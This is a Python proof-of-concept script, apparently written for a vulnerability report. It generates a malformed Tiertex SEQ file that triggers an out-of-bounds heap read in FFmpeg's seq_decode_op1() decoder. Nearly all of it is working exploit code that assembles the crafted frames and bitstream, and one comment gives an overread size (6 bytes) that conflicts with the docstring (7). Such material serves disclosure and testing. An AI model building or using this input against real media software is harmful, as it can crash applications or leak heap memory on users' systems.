#!/usr/bin/env python3
"""
PoC generator for VULN 001: Out-of-Bounds Read in seq_decode_op1()
File: libavcodec/tiertexseqv.c, lines 112-120

Vulnerability:
  In the else branch of seq_decode_op1, len (1-127) is read from the packet.
  bits = ff_log2_tab[len-1] + 1 is computed. A color_table of len bytes is set
  up and get_bits(&gb, bits) is called to read palette indices.
  When len is not a power of 2, 2^bits - 1 >= len, so get_bits can return an
  index >= len, causing OOB read past the packet buffer.

Trigger condition: len=65 (non-power-of-2, between 64 and 128)
  ff_log2_tab[64] = 6  -->  bits = 7
  max index from get_bits(gb, 7) = 2^7 - 1 = 127
  color_table only has 65 valid entries (indices 0..64)
  color_table[127] reads 7 bytes past the end of the packet allocation
"""

import struct
import os

SEQ_FRAME_SIZE = 6144   # Fixed frame size in the demuxer
NUM_PRELOAD = 100        # Number of preload iterations in seq_read_header

# --- Craft the video data block ---
# len=65: non-power-of-2, bits=ff_log2_tab[64]+1 = 7
LEN_VAL = 65
BITS = 7    # ff_log2_tab[64]+1 = 6+1 = 7
assert 2**(BITS-1) < LEN_VAL <= 2**BITS, "LEN_VAL should be non-power-of-2 in (2^(BITS-1), 2^BITS]"

# The bitmap for seqvideo_decode: 128 bytes encoding 2-bit op codes for 512 blocks.
# Block 0 (top-left 8x8): op=1 (bits [1:0] = 0b01)
# All other blocks: op=0 (skip)
bitmap = bytearray([0x01]) + bytearray(127)  # 128 bytes total

# op1 data:
#   byte 0:       len = 65 (triggers else branch since 65 & 0x80 = 0)
#   bytes 1..65:  color_table (65 entries)
#   bytes 66..121: pixel bitstream (BITS*8 = 56 bytes, all 0xFF)
#
# With all-0xFF pixel data and BITSTREAM_READER_LE, each 7-bit read returns 127.
# color_table[127] reads past end of packet by 6 bytes -> ASAN heap-buffer-overflow.
color_table = bytes(range(LEN_VAL))          # 65 bytes: 0x00..0x40
pixel_data  = bytes([0xFF] * (BITS * 8))     # 56 bytes: all ones -> index 127

op1_block = bytes([LEN_VAL]) + color_table + pixel_data  # 1+65+56 = 122 bytes

video_buf_content = bytes(bitmap) + op1_block  # 128+122 = 250 bytes
BUFFER_SIZE = len(video_buf_content)           # 250
assert BUFFER_SIZE == 250, f"Expected 250, got {BUFFER_SIZE}"

# --- Build the SEQ file ---
# File layout:
#   Bytes   0-255:        All zeros (required by seq_probe)
#   Bytes 256-257:        Buffer-0 size = 250 (uint16_le)
#   Bytes 258-259:        0 (terminates buffer-size list)
#   Frame 1 (offset 6144):
#       bytes 0-1:  audio_offs = 0
#       bytes 2-3:  pal_offs   = 0
#       byte  4:    buffer_num[0] = 0xFF (no output this frame)
#       byte  5:    buffer_num[1] = 0    (fill buffer 0 with video data)
#       bytes 6-7:  buffer_num[2..3] = 0
#       bytes 8-9:  offset_table[0] = 16 (data starts 16 bytes into frame)
#       bytes 10-11: offset_table[1] = 0
#       bytes 12-13: offset_table[2] = 0
#       bytes 14-15: offset_table[3] = 16+250 = 266 (end of fill data)
#       bytes 16+:  250 bytes of crafted video_buf_content
#   Frames 2-100 (offsets 12288..614400):
#       byte 4: buffer_num[0] = 0xFF (skip, don't output buffer 0 yet)
#       everything else = 0
#   Frame 101 (offset 620544):
#       buffer_num[0] = 0  --> output buffer 0's data (fill_size=250) as video
#       everything else = 0

TOTAL_FRAMES = 102  # give a bit of room after frame 101
total_size   = TOTAL_FRAMES * SEQ_FRAME_SIZE
file_data    = bytearray(total_size)

# Bytes 256-257: buffer 0 size
struct.pack_into('<H', file_data, 256, BUFFER_SIZE)
# Bytes 258-259: 0 terminator (already zero)

# Frame 1: fill buffer 0 with crafted video data
F1_OFF = SEQ_FRAME_SIZE  # = 6144
file_data[F1_OFF + 4] = 0xFF          # buffer_num[0] = 255 (no output this frame)
file_data[F1_OFF + 5] = 0x00          # buffer_num[1] = 0   (destination: buffer 0)
struct.pack_into('<H', file_data, F1_OFF + 8,  16)                   # offset_table[0] = 16
struct.pack_into('<H', file_data, F1_OFF + 14, 16 + BUFFER_SIZE)     # offset_table[3] = 266
# Write the crafted video data at byte 16 within frame 1
file_data[F1_OFF + 16 : F1_OFF + 16 + BUFFER_SIZE] = video_buf_content

# Frames 2-100: buffer_num[0] = 0xFF so buffer 0 is not consumed/reset
for i in range(2, 101):
    file_data[i * SEQ_FRAME_SIZE + 4] = 0xFF  # buffer_num[0] = 255

# Frame 101: buffer_num[0] = 0  -->  outputs buffer 0's fill_size=250 bytes as video
# (everything already zero, which means buffer_num[0]=0)

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.seq')
with open(out_path, 'wb') as f:
    f.write(file_data)

print(f"Generated: {out_path}")
print(f"  File size:    {len(file_data)} bytes ({len(file_data)//1024} KB)")
print(f"  LEN_VAL:      {LEN_VAL} (non-power-of-2)")
print(f"  bits:         {BITS}  (ff_log2_tab[{LEN_VAL-1}]+1)")
print(f"  Max index:    {2**BITS - 1}  (from get_bits(gb, {BITS}) with all-0xFF data)")
print(f"  OOB offset:   color_table[{2**BITS-1}]  (valid range: 0..{LEN_VAL-1})")
print(f"  Packet size:  {1 + BUFFER_SIZE} bytes  (1 flag + {BUFFER_SIZE} video)")
print(f"  OOB read at:  packet+{1+128+1+LEN_VAL + (2**BITS-1)}  (packet ends at {1+BUFFER_SIZE-1})")
print(f"  OOB by:       {1+128+1+LEN_VAL + (2**BITS-1) - (1+BUFFER_SIZE-1)} bytes past allocation")
